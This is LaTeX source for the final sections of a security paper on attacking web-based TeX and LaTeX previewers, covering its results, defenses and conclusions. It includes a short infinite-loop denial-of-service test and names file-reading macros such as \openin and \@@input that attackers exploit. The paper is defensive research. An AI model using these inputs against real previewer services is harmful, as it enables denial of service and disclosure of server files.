webservers typically have timeouts of several minutes for CGI\dash for
example, Apache and IIS both default to five minutes\dash this
infinite loop causes no real damage. However, the timeout is long
enough that a real attacker attempting a denial of service would
simply have to create new infinite loops every few minutes.}
No attempts
were made to write files, consequently those attacks are unevaluated.
Table~\ref{tab:vuln} contains the results of the attacks. As can be
seen, the majority of the attacks were successful.

\begin{lstlisting}[float,caption={Testing for
\cs{loop}.},label=lst:testloop,language={[LaTeX]TeX}]
\newif\iffoo\footrue
\loop before
\iffoo after \foofalse
\repeat
\end{lstlisting}

\subsubsection{Equation previewers}
The first group of \LaTeX\ previewers in
Table~\ref{tab:vuln}~\cite{mb,leefti,hupdlee,roee,lee,mu} are
meant to display a single mathematical statement at a
time. Many of the previewers' authors took precautions against several
of the file reading attacks described in Section~\ref{sec:read} by
attempting to preprocess the input and either remove or disallow
particular portions of input with varying degrees of success. All of
them neglected to account for the \TeX\ primitive, \cs{openin} and all
were potentially vulnerable to denial of service attacks via infinite
loops using either \cs{loop} or \cs{def}.

\subsubsection{Full document previewers}
The second group of \LaTeX\ previewers in
Table~\ref{tab:vuln}~\cite{lp,ssl,st,ll,loc,wl} are meant to display a
complete \LaTeX\ document.  By their very nature, full document
previewers must be permissive if they are to be useful. Full document
previewers are potentially vulnerable to all of the same
vulnerabilities as the equation previewers as well as vulnerabilities
that come from allowing the inclusion of packages. For example, the
Listings package, designed to typeset source code listings, can be used
to read and display text files. All of the full document previewers we
evaluate except for Scrib\TeX\dash which employs several of the
defenses discussed in Section~\ref{sec:defense}\dash are vulnerable to
all of the attacks except \cs{input}.


\subsubsection{MathTran}
MathTran~\cite{mt} was designed as a \TeX\ previewer with security in
mind. MathTran uses Secure plain \TeX, a reimplementation of
\texttt{plain} \TeX\ that prevents using any control sequence other
than those meant for typesetting. As a result, all of the attacks
described above fail, with the one exception of escaping from math
mode. This is the most secure web-based previewer we evaluate.

\iffullpaper
\subsubsection{\MP}
The one \MP\ previewer we evaluate~\cite{mpp} is vulnerable to reading
and writing files using the \MP\ commands. It is also vulnerable to
all of the attacks that~\cite{lp} is vulnerable to using the
\texttt{btex\ldots etex} construct.
\fi

\subsection{Defenses against attacks}
\label{sec:defense}
As we have seen, simply filtering out macros deemed unsafe is
problematic.  First,
the list of macros that would need to be
blacklisted is quite large, especially if the user can add additional packages. For
example, the \LaTeXe\ kernel alone defines the macros \cs{include},
\cs{input},
\cs{@input}, \cs{@iinput}, \cs{@input@}, \cs{@@input}, and
\cs{InputIfFileExists}~\cite{src}.  Second,
style and class files can contain additional
macros for reading files, for example \cs{lstinputlisting} from the
listings package or \cs{verbatiminput} from the verbatim package. The
blacklisting approach seems unlikely to succeed without a complete
understanding of \TeX\ and \LaTeX.

Instead of blacklisting unsafe macros, we could instead whitelist
macros deemed safe. This approach seems difficult to implement and
verify successfully. For example, it would be easy to overlook the
fact that \esc\ starts a new control sequence. In addition, for the
previewer to be useful, the list of acceptable control sequences would
be quite large. MathTran~\cite{mt} takes a similar approach,
except that rather than have a preprocessing step,
\texttt{plain} \TeX\ itself is completely reimplemented.

Rather than preprocessing the input, a better approach leverages the
power of \TeX\ to perform the input sanitization. The mathURL
previewer~\cite{mu} takes this approach by redefining \cs{input} and
\cs{include} to be no-op macros that just expand to their own arguments. Had
\cs{@@input} been redefined instead, the majority of the file reading
attacks would have failed since all of \LaTeX's input macros rely on
\cs{@@input}. Similar to blacklisting, this approach
requires deciding on a set of disallowed macros and then redefining
them; however, it does not fall prey to using the \esc, \cs{catcode},
\cs{csname}, or \cs{begin} attacks with the redefined macros. 
As with blacklisting, it still requires knowing which control
sequences to redefine.
\looseness=1

A more promising approach for preventing
\TeX\ from reading sensitive files is to leverage
\TeX\ runtime configuration parameters. Web2C-based \TeX\
distributions contain the runtime configuration parameter
\texttt{openin\_any} that, when set to \texttt p, for ``paranoid,''
disallows reading any files in a parent directory. By default,
this parameter is set to allow any files to be read. This relies on
the particular \TeX\ implementation correctly implementing this
parameter. Unfortunately, MiK\TeX\ does
not contain a similar configuration parameter.
A similar parameter for Web2C-based distributions controls writing.

A second approach (which can be used in concert with the first) is to
run \TeX\ in an operating system jail containing just the files needed
for the \TeX\ distribution. This approach has two major advantages.
First, it is not sensitive to details of the \TeX\ implementation.
Second, it allows us to leverage existing work on process isolation.

We note that  Scrib\TeX\ uses both the configuration and jail
approaches and this is the reason it is impervious to all of the file
reading attacks~\cite{st-personal}. 

Defending against denial of service attacks only requires a timeout
short enough to ensure that the server does not get overwhelmed.

\section{Conclusions}
\label{sec:conclusion}

Conventional wisdom in security distinguishes between ``safe'' and
``unsafe'' data files.  Binary files are more risky than text files;
content that interacts with the network is more risky than purely
local content.  In this paper, we argue that even seemingly safe data
files can be unsafe.  Although \TeX\ documents are plain text,
manipulating maliciously constructed \LaTeX\ documents or class files,
\BibTeX\ databases, or \MP\ graphics files can lead to arbitrary code
execution, viral infection, denial of service, and data exfiltration.

\iffullpaper\else
\vspace*{4pt}% Major hack.
\fi

\phantomsection
\addcontentsline{toc}{section}{Acknowledgments}
\section*{Acknowledgments}
We thank Stefan Savage for numerous helpful conversations; Troy
Henderson for letting us experiment extensively with his \LaTeX\ and
\MP\ previewers; \_llll\_ from FreeNode's \#latex for pointing out
the \cs{begin} attack; and the anonymous reviewers for their helpful
comments.

{\small\raggedright
\phantomsection
\addcontentsline{toc}{section}{\refname}%
\bibliographystyle{plain}
\bibliography{references}}

\end{document}
